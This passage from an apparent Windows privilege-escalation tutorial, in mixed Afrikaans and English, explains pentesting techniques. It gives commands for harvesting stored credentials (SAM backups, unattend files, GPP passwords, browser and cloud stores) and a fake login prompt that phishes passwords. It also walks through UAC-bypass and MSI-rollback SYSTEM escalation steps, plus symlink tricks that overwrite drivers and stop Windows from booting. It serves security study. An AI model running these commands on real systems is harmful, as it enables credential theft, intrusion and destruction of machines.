As jy enige inskrywing binne daardie pad vind, sal dit waarskynlik ’n gestoorde SSH-sleutel wees. Dit word geïnkripteer gestoor, maar kan maklik gedekripteer word met [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Meer inligting oor hierdie tegniek hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

As die `ssh-agent`-diens nie loop nie en jy wil hê dit moet outomaties tydens selflaai begin, voer uit:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Dit lyk asof hierdie tegniek nie meer geldig is nie. Ek het probeer om ’n paar SSH-sleutels te skep, dit met `ssh-add` by te voeg en via SSH by ’n masjien aan te meld. Die register `HKCU\Software\OpenSSH\Agent\Keys` bestaan nie, en procmon het nie die gebruik van `dpapi.dll` tydens die asymmetriese sleutelverifikasie geïdentifiseer nie.

### Onbeheerde lêers
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Jy kan ook vir hierdie lêers soek met **metasploit**: _post/windows/gather/enum_unattend_

Voorbeeldinhoud:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM- en SYSTEM-rugsteunkopieë
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Wolk-aanmeldbewyse
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Soek vir ’n lêer genaamd **SiteList.xml**

### Gekasde GPP-wagwoord

’n Funksie was voorheen beskikbaar wat die ontplooiing van pasgemaakte plaaslike administrateurrekeninge op ’n groep masjiene via Group Policy Preferences (GPP) moontlik gemaak het. Hierdie metode het egter beduidende sekuriteitsfoute gehad. Eerstens kon enige domeingebruiker toegang verkry tot die Group Policy Objects (GPOs), wat as XML-lêers in SYSVOL gestoor is. Tweedens kon die wagwoorde binne hierdie GPPs, wat met AES256 deur ’n publiek gedokumenteerde versteksleutel geënkripteer is, deur enige geverifieerde gebruiker gedekripteer word. Dit het ’n ernstige risiko ingehou, aangesien dit gebruikers kon toelaat om verhoogde voorregte te verkry.

Om hierdie risiko te versag, is ’n funksie ontwikkel om te soek na plaaslik gekasde GPP-lêers wat ’n "cpassword"-veld bevat wat nie leeg is nie. Wanneer so ’n lêer gevind word, dekripteer die funksie die wagwoord en stuur dit ’n pasgemaakte PowerShell-objek terug. Hierdie objek bevat besonderhede oor die GPP en die lêer se ligging, wat help met die identifisering en regstelling van hierdie sekuriteitskwesbaarheid.

Soek in `C:\ProgramData\Microsoft\Group Policy\history` of in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (voor W Vista)_ vir hierdie lêers:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Om die cPassword te dekripteer:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Gebruik crackmapexec om die wagwoorde te kry:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS-webkonfigurasie
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Voorbeeld van web.config met credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN-geloofsbriewe
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Vra vir credentials

Jy kan altyd **die gebruiker vra om sy credentials, of selfs die credentials van ’n ander gebruiker, in te voer** indien jy dink hy ken dit (let daarop dat dit werklik **riskant is om die kliënt direk vir die credentials te vra**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Moontlike lêername wat credentials bevat**

Bekende lêers wat voorheen **wagwoorde** in **clear-text** of **Base64** bevat het
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Soek al die voorgestelde lêers:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Geloofsbriewe in die Asblik

Jy moet ook die Asblik nagaan om na geloofsbriewe daarin te soek

Om **wagwoorde te herstel** wat deur verskeie programme gestoor is, kan jy gebruik: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Binne die register

**Ander moontlike registersleutels met geloofsbriewe**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsergeskiedenis

Jy moet kyk vir dbs waar wagwoorde van **Chrome of Firefox** gestoor word.\
Kyk ook na die geskiedenis, boekmerke en gunstelinge van die browsers, want dalk word sommige **wagwoorde daar gestoor**.

Tools om wagwoorde uit browsers te onttrek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** is ’n tegnologie wat in die Windows-bedryfstelsel ingebou is en wat **interkommunikasie** tussen sagtewarekomponente van verskillende tale moontlik maak. Elke COM-komponent word **deur middel van ’n klas-ID (CLSID) geïdentifiseer**, en elke komponent stel funksionaliteit bloot via een of meer koppelvlakke, wat deur koppelvlak-ID’s (IIDs) geïdentifiseer word.

COM-klasse en -koppelvlakke word onderskeidelik in die register onder **HKEY\CLASSES\ROOT\CLSID** en **HKEY\CLASSES\ROOT\Interface** gedefinieer. Hierdie register word geskep deur **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** saam te voeg.

Binne die CLSID’s van hierdie register kan jy die child-register **InProcServer32** vind, wat ’n **default value** bevat wat na ’n **DLL** wys, asook ’n waarde genaamd **ThreadingModel** wat **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single of Multi) of **Neutral** (Thread Neutral) kan wees.

![Browsers History - COM DLL Overwriting: Binne die CLSID’s van hierdie register kan jy die child-register InProcServer32 vind, wat ’n default value bevat wat na ’n DLL wys, asook ’n waarde...](<../../images/image (729).png>)

Basies, as jy enige van die **DLL’s** wat uitgevoer gaan word kan **overwrite**, kan jy **privileges eskaleer** as daardie DLL deur ’n ander gebruiker uitgevoer gaan word.

Om te leer hoe attackers COM Hijacking as ’n persistence-meganisme gebruik, kyk na:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Soek na 'n lêer met 'n spesifieke lêernaam**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Soek die register vir sleutelname en wagwoorde**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Gereedskap wat vir wagwoorde soek

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is 'n msf** plugin wat ek geskep het om **outomaties elke Metasploit POST module uit te voer wat binne die slagoffer na credentials soek**.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) soek outomaties na al die lêers wat wagwoorde bevat wat op hierdie bladsy genoem word.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is nog 'n uitstekende hulpmiddel om wagwoorde uit 'n stelsel te onttrek.

Die hulpmiddel [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) soek na **sessions**, **usernames** en **passwords** van verskeie tools wat hierdie data in clear text stoor (PuTTY, WinSCP, FileZilla, SuperPuTTY en RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Stel jou voor dat **'n process wat as SYSTEM loop 'n nuwe process** (`OpenProcess()`) **met volle toegang oopmaak**. Dieselfde process **skep ook 'n nuwe process** (`CreateProcess()`) **met lae privileges, maar erf al die oop handles van die hoofprocess**.\
As jy dan **volle toegang tot die process met lae privileges het**, kan jy die **oop handle na die geprivilegeerde process wat met** `OpenProcess()` **geskep is, bekom en shellcode inject**.\
[Lees hierdie voorbeeld vir meer inligting oor **hoe om hierdie kwesbaarheid op te spoor en uit te buit**.](leaked-handle-exploitation.md)\
[Lees hierdie **ander plasing vir 'n meer volledige verduideliking van hoe om meer oop handles van prosesse en threads wat met verskillende vlakke van permissions geërf is, te toets en te abuse (nie net volle toegang nie)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gedeelde geheuesegmente, waarna as **pipes** verwys word, maak process-kommunikasie en data-oordrag moontlik.

Windows verskaf 'n funksie genaamd **Named Pipes**, wat onverwante prosesse toelaat om data te deel, selfs oor verskillende netwerke. Dit lyk soos 'n client/server-argitektuur, met rolle wat as **named pipe server** en **named pipe client** gedefinieer word.

Wanneer data deur 'n **client** via 'n pipe gestuur word, het die **server** wat die pipe opgestel het die vermoë om die identiteit van die **client** **aan te neem**, mits dit die nodige **SeImpersonate**-regte het. Om 'n **geprivilegeerde process** te identifiseer wat kommunikeer via 'n pipe wat jy kan naboots, bied 'n geleentheid om **hoër privileges te verkry** deur die identiteit van daardie process aan te neem sodra dit met die pipe wat jy opgestel het, interaksie het. Instruksies oor hoe om so 'n aanval uit te voer, kan [**hier**](named-pipe-client-impersonation.md) en [**hier**](#from-high-integrity-to-system) gevind word.

Die volgende tool laat jou ook toe om 'n named pipe-kommunikasie met 'n tool soos burp te **intercept**: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **en hierdie tool laat jou toe om al die pipes te lys en te sien om privescs te vind** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Die Telephony-diens (TapiSrv) in server-modus stel `\\pipe\\tapsrv` (MS-TRP) bloot. 'n Remote geauthentiseerde client kan die mailslot-gebaseerde async event-pad abuse om `ClientAttach` in 'n arbitrêre **4-byte write** na enige bestaande lêer wat deur `NETWORK SERVICE` geskryf kan word, te verander, en daarna Telephony-adminregte te verkry en 'n arbitrêre DLL as die diens te laai. Volledige vloei:

- `ClientAttach` met `pszDomainUser` gestel op 'n bestaande pad wat geskryf kan word → die diens maak dit oop via `CreateFileW(..., OPEN_EXISTING)` en gebruik dit vir async event-writes.
- Elke event skryf die aanvaller-beheerde `InitContext` vanaf `Initialize` na daardie handle. Registreer 'n line app met `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), haal dit via `GetAsyncEvents` (`Req_Func 0`) op, en unregister/shutdown daarna om deterministiese writes te herhaal.
- Voeg jouself by `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, en roep `GetUIDllName` met 'n arbitrêre DLL-pad aan om `TSPI_providerUIIdentify` as `NETWORK SERVICE` uit te voer.

Meer besonderhede:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Diverse

### Lêeruitbreidings wat dinge in Windows kan uitvoer

Besoek die bladsy **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown-renderers

Klikbare Markdown-skakels wat na `ShellExecuteExW` aangestuur word, kan gevaarlike URI-handlers (`file:`, `ms-appinstaller:` of enige geregistreerde skema) trigger en aanvaller-beheerde lêers as die huidige gebruiker uitvoer. Sien:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitering van Command Lines vir wagwoorde**

Wanneer jy 'n shell as 'n gebruiker kry, kan daar scheduled tasks of ander prosesse wees wat uitgevoer word en **credentials op die command line deurgee**. Die script hieronder vang process-command lines elke twee sekondes vas en vergelyk die huidige toestand met die vorige toestand, en voer enige verskille uit.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Wagwoorde uit prosesse steel

## Van Low Priv User na NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

As jy toegang tot die grafiese koppelvlak het (via die konsole of RDP) en UAC geaktiveer is, is dit in sommige weergawes van Microsoft Windows moontlik om ’n terminale of enige ander proses soos "NT\AUTHORITY SYSTEM" vanaf ’n onbevoorregte gebruiker te laat loop.

Dit maak dit moontlik om voorregte te eskaleer en UAC terselfdertyd met dieselfde kwesbaarheid te omseil. Daarbenewens is dit nie nodig om enigiets te installeer nie, en die binary wat tydens die proses gebruik word, is deur Microsoft onderteken en uitgereik.

Sommige van die geaffekteerde stelsels is die volgende:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Om hierdie kwesbaarheid uit te buit, is dit nodig om die volgende stappe uit te voer:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Die aanval bestaan basies uit die misbruik van Windows Installer se rollback-funksie om wettige files tydens die uninstall-proses met malicious files te vervang. Hiervoor moet die attacker ’n **malicious MSI installer** skep wat gebruik sal word om die `C:\Config.Msi`-folder te kaap. Windows Installer sal hierdie folder later gebruik om rollback-files tydens die uninstall van ander MSI-packages te stoor, waar die rollback-files aangepas sou wees om die malicious payload te bevat.

Die opgesomde tegniek is die volgende:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Skep ’n `.msi` wat ’n harmless file (byvoorbeeld `dummy.txt`) in ’n writable folder (`TARGETDIR`) installeer.
- Merk die installer as **"UAC Compliant"**, sodat ’n **non-admin user** dit kan uitvoer.
- Hou ’n **handle** na die file oop ná die installasie.

- Step 2: Begin Uninstall
- Uninstall dieselfde `.msi`.
- Die uninstall-proses begin om files na `C:\Config.Msi` te skuif en hulle na `.rbf`-files te hernoem (rollback backups).
- **Poll the open file handle** met `GetFinalPathNameByHandle` om vas te stel wanneer die file `C:\Config.Msi\<random>.rbf` word.

- Step 3: Custom Syncing
- Die `.msi` bevat ’n **custom uninstall action (`SyncOnRbfWritten`)** wat:
- ’n Sein stuur wanneer `.rbf` geskryf is.
- Dan op ’n ander event **wag** voordat die uninstall voortgaan.

- Step 4: Block Deletion of `.rbf`
- Wanneer dit gesein word, **open die `.rbf` file** sonder `FILE_SHARE_DELETE` — dit **verhoed dat dit deleted word**.
- Stuur dan ’n sein terug sodat die uninstall kan voltooi.
- Windows Installer kan nie die `.rbf` delete nie, en omdat dit nie al die inhoud kan delete nie, word **`C:\Config.Msi` nie verwyder nie**.

- Step 5: Manually Delete `.rbf`
- Jy (attacker) delete die `.rbf` file manually.
- Nou is **`C:\Config.Msi` empty**, gereed om gekaap te word.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Skep die `C:\Config.Msi`-folder self weer.
- Stel **weak DACLs** (byvoorbeeld Everyone:F) en **hou ’n handle oop** met `WRITE_DAC`.

- Step 7: Run Another Install
- Installeer die `.msi` weer, met:
- `TARGETDIR`: Writable location.
- `ERROROUT`: ’n Variable wat ’n forced failure veroorsaak.
- Hierdie installasie sal gebruik word om **rollback** weer te trigger, wat `.rbs` en `.rbf` lees.

- Step 8: Monitor for `.rbs`
- Gebruik `ReadDirectoryChangesW` om `C:\Config.Msi` te monitor totdat ’n nuwe `.rbs` verskyn.
- Capture sy filename.

- Step 9: Sync Before Rollback
- Die `.msi` bevat ’n **custom install action (`SyncBeforeRollback`)** wat:
- ’n Event sein wanneer die `.rbs` geskep word.
- Dan **wag** voordat dit voortgaan.

- Step 10: Reapply Weak ACL
- Nadat jy die `.rbs created`-event ontvang het:
- Die Windows Installer **pas strong ACLs weer toe** op `C:\Config.Msi`.
- Maar omdat jy steeds ’n handle met `WRITE_DAC` het, kan jy **weak ACLs weer toepas**.

> ACLs word **slegs afgedwing wanneer ’n handle geopen word**, dus kan jy steeds na die folder skryf.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Oorskryf die `.rbs`-file met ’n **fake rollback script** wat aan Windows sê om:
- Jou `.rbf`-file (malicious DLL) in ’n **privileged location** te restore (byvoorbeeld, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Jou fake `.rbf` te drop wat ’n **malicious SYSTEM-level payload DLL** bevat.

- Step 12: Trigger the Rollback
- Sein die sync-event sodat die installer voortgaan.
- ’n **type 19 custom action (`ErrorOut`)** is ingestel om die installasie **intentionally** op ’n bekende punt te laat fail.
- Dit veroorsaak dat **rollback begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Lees jou malicious `.rbs`.
- Copy jou `.rbf` DLL na die target location.
- Jy het nou jou **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run ’n trusted **auto-elevated binary** (byvoorbeeld, `osk.exe`) wat die DLL wat jy gekaap het, laai.
- **Boom**: Jou code word **as SYSTEM** uitgevoer.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Die hoof-MSI rollback-tegniek (die vorige een) aanvaar dat jy ’n **hele folder** (byvoorbeeld, `C:\Config.Msi`) kan delete. Maar wat as jou vulnerability slegs **arbitrary file deletion** toelaat?

Jy kan **NTFS internals** uitbuit: elke folder het ’n hidden alternate data stream genaamd:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Hierdie stroom stoor die **indeksmetadata** van die vouer.

Dus, as jy die **`::$INDEX_ALLOCATION`-stroom** van ’n vouer **uitvee**, verwyder NTFS **die hele vouer** uit die lêerstelsel.

Jy kan dit doen deur standaardlêeruitvee-API’s soos:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Alhoewel jy ’n *file* delete API oproep, **delete dit die folder self**.

### Van Folder Contents Delete na SYSTEM EoP
Wat as jou primitive jou nie toelaat om arbitrêre files/folders te delete nie, maar dit **wel deletion van die *contents* van ’n attacker-controlled folder toelaat**?

1. Step 1: Stel ’n bait folder en file op
- Create: `C:\temp\folder1`
- Daarbinne: `C:\temp\folder1\file1.txt`

2. Step 2: Plaas ’n **oplock** op `file1.txt`
- Die oplock **pause execution** wanneer ’n privileged process probeer om `file1.txt` te delete.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Stap 3: Trigger SYSTEM-proses (bv. `SilentCleanup`)
- Hierdie proses skandeer vouers (bv. `%TEMP%`) en probeer om die inhoud daarvan te verwyder.
- Wanneer dit by `file1.txt` kom, **oplock trigger** en gee dit beheer aan jou callback.

4. Stap 4: Binne die oplock callback – herlei die verwydering

- Opsie A: Skuif `file1.txt` elders heen
- Dit maak `folder1` leeg sonder om die oplock te breek.
- Moenie `file1.txt` direk verwyder nie — dit sal die oplock voortydig vrystel.

- Opsie B: Skakel `folder1` om in ’n **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opsie C: Skep ’n **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Dit teiken die interne NTFS-stroom wat vouermetadata stoor — wanneer dit uitgevee word, word die vouer uitgevee.

5. Stap 5: Stel die oplock vry
- SYSTEM-proses gaan voort en probeer om `file1.txt` uit te vee.
- Maar nou, weens die junction + symlink, vee dit eintlik die volgende uit:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Resultaat**: `C:\Config.Msi` word deur SYSTEM uitgevee.

### Van Arbitrary Folder Create na Permanent DoS

Benut ’n primitive waarmee jy ’n arbitrary folder as SYSTEM/admin kan create — selfs al kan jy nie files write of weak permissions set nie.

Skep ’n **folder** (nie ’n file nie) met die naam van ’n **critical Windows driver**, byvoorbeeld:
```
C:\Windows\System32\cng.sys
```
- Hierdie pad stem normaalweg ooreen met die `cng.sys` kernel-mode driver.
- As jy dit **vooraf as ’n vouer skep**, kan Windows nie die werklike driver tydens boot laai nie.
- Daarna probeer Windows om `cng.sys` tydens boot te laai.
- Dit sien die vouer, **kan nie die werklike driver resolve nie**, en **crash of stop boot**.
- Daar is **geen fallback** en **geen recovery** sonder eksterne ingryping nie (bv. boot repair of skyftoegang).

### Van bevoorregte log/backup-paaie + OM symlinks na arbitrary file overwrite / boot DoS

Wanneer ’n **bevoorregte diens** logs/exports skryf na ’n pad wat vanuit ’n **skryfbare config** gelees word, kan jy daardie pad met **Object Manager symlinks + NTFS mount points** herlei om die bevoorregte skryfbewerking in ’n arbitrary overwrite te verander (selfs **sonder** SeCreateSymbolicLinkPrivilege).

**Vereistes**
- Die config wat die teikenpad stoor, is skryfbaar deur die attacker (bv. `%ProgramData%\...\.ini`).
- Vermoë om ’n mount point na `\RPC Control` en ’n OM file symlink te skep (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- ’n Bevoorregte bewerking wat na daardie pad skryf (log, export, report).

**Voorbeeldketting**
1. Lees die config om die bevoorregte logbestemming te verkry, bv. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Herlei die pad sonder admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Wag vir die bevoorregte komponent om die log te skryf (bv. die admin aktiveer "stuur toets-SMS"). Die skrywing beland nou in `C:\Windows\System32\cng.sys`.
4. Inspekteer die oorgeskrewe teiken (hex/PE-parser) om korrupsie te bevestig; ’n herlaai dwing Windows om die gewysigde drywerpad te laai → **boot loop DoS**. Dit veralgemeen ook na enige beskermde lêer wat ’n bevoorregte diens vir skryfdoeleindes sal oopmaak.

